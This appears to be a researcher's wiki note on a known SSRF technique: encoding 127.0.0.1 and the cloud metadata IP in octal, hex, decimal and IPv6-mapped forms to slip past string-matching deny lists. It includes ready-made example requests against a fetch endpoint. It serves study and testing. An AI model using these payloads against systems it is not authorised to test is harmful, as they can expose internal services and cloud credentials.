---
title: SSRF allowlist bypass via IP-format encoding
slug: octal-ip-ssrf
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-13T00:00:00Z
tags: [technique/ssrf, technique/url-parsing]
inbound: []
---

# SSRF IP-format bypass

## Pattern
IP RFC says it's a 32-bit integer; quad-dotted is convention only. Each
parser interprets octal/decimal/hex/4-dot/2-dot variants differently.
Use these for SSRF allowlist bypass when the deny check string-matches
on `127.0.0.1` / `169.254.169.254`.

Variants for `127.0.0.1`:
- Octal: `0177.0.0.1`
- Hex: `0x7f000001`
- 32-bit decimal: `2130706433`
- 2-dot mixed: `127.1`
- Mixed: `0177.1`
- IPv6-mapped: `[::ffff:127.0.0.1]`, `[::ffff:7f00:1]`

Variants for `169.254.169.254`:
- Decimal: `2852039166`
- Hex: `0xa9fea9fe`
- Octal: `0251.0376.0251.0376`
- Two-dot: `169.254.43518`

## Preconditions
- SSRF where allowlist/denylist string-matches the IP literal.

## Detection
- Test each encoding variant against the allowlist.

## Triggering
```
GET /fetch?url=http://0177.0.0.1/admin
GET /fetch?url=http://2130706433/admin
GET /fetch?url=http://[::ffff:127.0.0.1]/admin
```

## Related
- [[multi-a-dns-rebind]]
- DNS rebinding via `0.0.0.0` (Chrome multi-A — Ep 21).

## Seen in the wild
- Recurring across SSRF-fix bypasses in 2023 (Eps 34, 37).

## References
- Critical Thinking Podcast Eps 9, 34, 37
- Orange Tsai URL-parsing talks
